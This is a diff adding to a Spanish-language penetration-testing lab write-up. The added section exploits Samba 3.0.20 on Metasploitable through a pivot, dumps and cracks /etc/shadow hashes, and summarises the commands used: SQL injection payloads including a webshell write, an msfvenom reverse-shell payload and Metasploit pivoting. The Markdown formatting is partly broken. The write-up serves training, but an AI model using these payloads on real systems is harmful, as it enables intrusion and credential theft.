@@ -987,3 +987,346 @@ run
 ```
 
 **Resultado:**
+```
+[*] 192.168.8.133:139     - Host could not be identified: Unix (Samba 3.0.20-Debian)
+```
+Buscar exploit:**
+searchsploit samba 3.0.20
+```
+
+**Resultado:**
+```
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution (Metasploit)
+```
+
+---
+
+### 6.2 Configurar Exploit
+```
+use exploit/multi/samba/usermap_script
+show options
+```
+
+**Configuración:**
+```
+set RHOSTS 192.168.8.133
+set PAYLOAD cmd/unix/bind_perl
+show options
+```
+
+**Verificar configuración:**
+```
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.8.133    yes       Target address
+   RPORT   139              yes       Target port
+
+Payload options (cmd/unix/bind_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       Listener port
+   RHOST  192.168.8.133    yes       Target address
+```
+
+---
+
+### 6.3 Ejecutar Exploit
+```
+exploit
+```
+
+**Resultado:**
+```
+[*] Started bind TCP handler against 192.168.8.133:4444
+[*] Command shell session 2 opened (192.168.8.131:40362 -> 192.168.8.133:4444 via session 1) at 2026-01-09 13:45:23 -0500
+```
+
+**✅ Shell obtenida en Metasploitable**
+
+**Nota:** `via session 1` indica que está usando la sesión Meterpreter como punto de pivote.
+
+![Exploit Samba](img/samba1.jpg)
+
+---
+
+### 6.4 Verificar Acceso
+```
+whoami
+```
+
+**Resultado:**
+```
+root
+```
+```
+id
+```
+
+**Resultado:**
+```
+uid=0(root) gid=0(root)
+```
+
+**✅ Acceso ROOT obtenido!**
+
+
+![Acceso root obtenido](img/acceso-root.jpg)
+
+---
+
+### 6.5 Enumeración del Sistema
+
+**Hostname:**
+```
+hostname
+```
+**Resultado:** `metasploitable`
+
+**Sistema operativo:**
+```
+uname -a
+```
+**Resultado:**
+```
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+```
+
+**Interfaces de red:**
+```
+ifconfig
+```
+**Resultado:**
+```
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:80:d3:95
+          inet addr:192.168.8.133  Bcast:192.168.8.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+```
+
+![Enumeración](img/comandos-varios.jpg)
+
+---
+
+## 7. Fase 6: Post-Explotación Avanzada
+
+### 7.1 Extracción de /etc/shadow
+```
+cat /etc/shadow
+```
+
+**Resultado:**
+```
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+
+Guardar hashes:
+# Desde Kali, crear archivo hashes.txt:
+nano hashes.txt
+```
+
+**Contenido de hashes.txt:**
+```
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
+
+
+![Extracción del archivo shadow](img/cat-etc.jpg)
+
+7.2 Identificar Tipo de Hash
+bash# Desde Kali:
+hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
+```
+
+**Resultado:**
+```
+Analyzing '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
+[+] MD5 Crypt
+[+] Cisco-IOS(MD5)
+[+] FreeBSD MD5
+Conclusión: Hashes MD5 Crypt ($1$)
+
+7.3 Cracking con John the Ripper
+bash# Desde Kali:
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+**Proceso:**
+```
+Using default input encoding: UTF-8
+Loaded 7 password hashes with 7 different salts (md5crypt [MD5 32/64])
+Cost 1 (iteration count) is 1000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+123456789        (klog)
+batman           (sys)
+service          (service)
+
+3g 0:00:02:45 DONE (2026-01-09 14:15) 0.01818g/s 192384p/s 192384c/s 1345Kc/s
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+Ver resultados:
+bashjohn --show hashes.txt
+```
+
+**Resultado:**
+```
+klog:123456789
+sys:batman
+service:service
+
+3 password hashes cracked, 4 left
+
+
+![Resultados de John the Ripper](img/john-ripper.jpg)
+
+7.4 Resumen de Credenciales Crackeadas
+UsuarioHash (MD5 Crypt)ContraseñaEstadoklog$1$f2ZVMS4K$R9XkI.Cm...123456789✅ Crackeadosys$1$fUX6BPOt$Miyc3Up...batman✅ Crackeadoservice$1$kR3ue7JZ$7GxELD...service✅ Crackeadoroot$1$/avpfBJ1$x0z8w5U...-❌ No crackeadomsfadmin$1$XN10Zj2c$Rt/zzC...-❌ No crackeadouser$1$HESu9xrH$k.o3G93...-❌ No crackeadopostgres$1$Rw35ik.x$MgQgZU...-❌ No crackeado
+
+8. Resumen de Comandos Utilizados
+Reconocimiento
+bash# Burp Suite
+burpsuite &
+
+# Skipfish
+skipfish -YO -o ~/Desktop/skipfish_resultados http://192.168.0.21/mutillidae/index.php
+SQL Injection
+sql-- Extracción de usuarios
+' OR 1=1-- 
+
+-- Bypass autenticación
+' OR 1=1-- 
+
+-- Determinar columnas
+' ORDER BY 7-- 
+
+-- Obtener BD
+' UNION SELECT null,database(),null,null,null,null,null-- 
+
+-- Obtener versión
+' UNION SELECT null,version(),null,null,null,null,null-- 
+
+-- Listar tablas
+' UNION SELECT null,table_name,null,null,null,null,null FROM information_schema.tables WHERE table_schema='mutillidae'-- 
+
+-- Leer archivo
+' UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null,null,null,null-- 
+
+-- Upload webshell
+' UNION SELECT null,null,null,null,null,null,'[CÓDIGO PHP]' INTO DUMPFILE '/var/www/html/mutillidae/backdoor.php'--
+Webshell Commands
+bashwhoami
+ls -la
+cat /etc/passwd
+ip addr show
+ping -c 1 192.168.8.133
+Metasploit - Meterpreter
+bash# Generar payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=4444 -f elf > shell.elf
+
+# Servir payload
+python3 -m http.server 8000
+
+# Listener
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.0.30
+set LPORT 4444
+exploit
+
+# Pivoting
+run autoroute -s 192.168.8.0/24
+run autoroute -p
+background
+Metasploit - Samba Exploit
+bash# Escaneo de puertos
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.8.133
+set PORTS 1-10000
+run
+
+# Exploit Samba
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.8.133
+set PAYLOAD cmd/unix/bind_perl
+exploit
+Password Cracking
+bash# Identificar hash
+hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
+
+# Crackear con John
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Ver resultados
+john --show hashes.txt
+
+9. Herramientas y Versiones
+HerramientaVersiónPropósitoKali Linux2024.1Sistema operativo atacanteBurp Suite Community2024.xProxy interceptorSkipfish2.10bWeb scannerMetasploit Framework6.3.xPlataforma de explotaciónmsfvenom6.3.xGenerador de payloadsJohn the Ripper1.9.0Password crackerPython3.11HTTP serverFirefox115 ESRNavegador web
+
+10. Tiempo Estimado por Fase
+FaseTiempoComplejidadSetup del Lab2 horasMediaReconocimiento1 horaBajaExplotación Web2 horasMedia-AltaPost-Explotación30 minBajaPivoting1.5 horasAltaExplotación Red Interna1 horaMediaPost-Explotación Avanzada1 horaMediaTOTAL~9 horas-
+
+11. Troubleshooting Común
+Problema: Webshell no se crea
+Solución:
+bash# En Ubuntu:
+sudo chmod 777 /var/www/html/mutillidae/
+
+# Verificar secure_file_priv en MySQL:
+sudo mysql -u root -p
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+# Si no está vacío:
+sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
+# Añadir: secure_file_priv = ""
+sudo systemctl restart mysql
+Problema: Meterpreter no conecta
+Solución:
+bash# Verificar firewall en Kali:
+sudo iptables -L
+sudo ufw status
+
+# Verificar que el payload se ejecutó:
+# En webshell: ps aux | grep shell.elf
+Problema: Autoroute no funciona
+Solución:
+bash# Verificar sesión Meterpreter activa:
+sessions -l
+
+# Verificar rutas:
+sessions -i 1
+run autoroute -p
+
+# Re-añadir ruta si es necesario:
+run autoroute -s 192.168.8.0/24
+
+12. Referencias
+
+OWASP Testing Guide
+Metasploit Unleashed
+Burp Suite Documentation
+CVE-2007-2447
+Pivoting Techniques
+
+
+Autor: Estefanía Ramírez Martínez
+Fecha: Enero 2025
+Licencia: MIT
+
+
+
+
